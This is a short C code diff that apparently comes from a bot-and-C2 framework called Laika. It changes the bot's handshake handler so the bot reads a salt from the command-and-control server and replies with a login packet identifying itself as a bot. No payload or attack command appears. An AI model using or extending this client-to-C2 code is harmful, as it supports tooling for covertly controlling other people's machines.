@@ -8,10 +8,21 @@
 
 void laikaB_handleHandshakeResponse(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
 {
-    struct sLaika_bot *bot = (struct sLaika_bot *)uData;
+    uint8_t saltBuf[LAIKA_HANDSHAKE_SALT_LEN];
     uint8_t endianness = laikaS_readByte(&peer->sock);
+    laikaS_read(&peer->sock, saltBuf, LAIKA_HANDSHAKE_SALT_LEN);
 
     peer->sock.flipEndian = endianness != laikaS_isBigEndian();
+
+    /* set peer salt */
+    laikaS_setSalt(peer, saltBuf);
+
+    /* sent PEER_LOGIN packet */
+    laikaS_startOutPacket(peer, LAIKAPKT_PEER_LOGIN_REQ);
+    laikaS_writeByte(&peer->sock, PEER_BOT);
+    laikaS_write(&peer->sock, saltBuf, LAIKA_HANDSHAKE_SALT_LEN);
+    laikaS_endOutPacket(peer);
+
     LAIKA_DEBUG("handshake accepted by cnc! got endian flag : %s\n",
                 (endianness ? "TRUE" : "FALSE"));
 }
@@ -29,7 +40,7 @@ void laikaB_handlePing(struct sLaika_peer *peer, LAIKAPKT_SIZE sz, void *uData)
 struct sLaika_peerPacketInfo laikaB_pktTbl[LAIKAPKT_MAXNONE] = {
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_HANDSHAKE_RES,
         laikaB_handleHandshakeResponse,
-        sizeof(uint8_t),
+        sizeof(uint8_t) + LAIKA_HANDSHAKE_SALT_LEN,
     false),
     LAIKA_CREATE_PACKET_INFO(LAIKAPKT_PINGPONG,
         laikaB_handlePing,
